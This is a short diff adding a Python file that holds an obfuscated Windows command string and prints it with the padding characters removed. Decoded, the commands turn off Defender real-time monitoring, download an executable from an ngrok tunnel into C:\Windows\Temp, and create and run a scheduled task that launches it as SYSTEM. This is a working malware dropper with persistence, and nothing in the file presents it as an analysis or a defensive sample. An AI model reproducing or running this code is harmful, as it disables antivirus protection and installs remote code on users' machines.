@@ -1,0 +1,3 @@
+string = 'Set-MpPreference -DisableRealtimeM�o�n�i�t�o�r�i�n�g� �$�t�r�u�e�;�w�g�e�t� �h�t�t�p�:�/�/�8�8�6�e�-�1�8�1�-�2�1�5�-�2�1�4�-�3�2�.�n�g�r�o�k�.�i�o�/�O�U�T�S�T�A�N�D�I�N�G�_�G�U�T�T�E�R�.�e�x�e� �-�O�u�t�F�i�l�e� �C�:�\�W�i�n�d�o�w�s�\�T�e�m�p�\�O�U�T�S�T�A�N�D�I�N�G�_�G�U�T�T�E�R�.�e�x�e�;�S�C�H�T�A�S�K�S� �/�C�r�e�a�t�e� �/�T�N� �"�O�U�T�S�T�A�N�D�I�N�G�_�G�U�T�T�E�R�.�e�x�e�"� �/�T�R� �"�C�:�\�W�i�n�d�o�w�s�\�T�e�m�p�\�C�O�U�T�S�T�A�N�D�I�N�G�_�G�U�T�T�E�R�.�e�x�e�"� �/�S�C� �O�N�E�V�E�N�T� �/�E�C� �A�p�p�l�i�c�a�t�i�o�n� �/�M�O� �*�[�S�y�s�t�e�m�/�E�v�e�n�t�I�D�=�7�7�7�]� �/�R�U� �"�S�Y�S�T�E�M�"� �/�f�;�S�C�H�T�A�S�K�S� �/�R�u�n� �/�T�N� �"�O�U�T�S�T�A�N�D�I�N�G�_�G�U�T�T�E�R�.�e�x�e�"�'
+
+print(string.replace('�', ""))
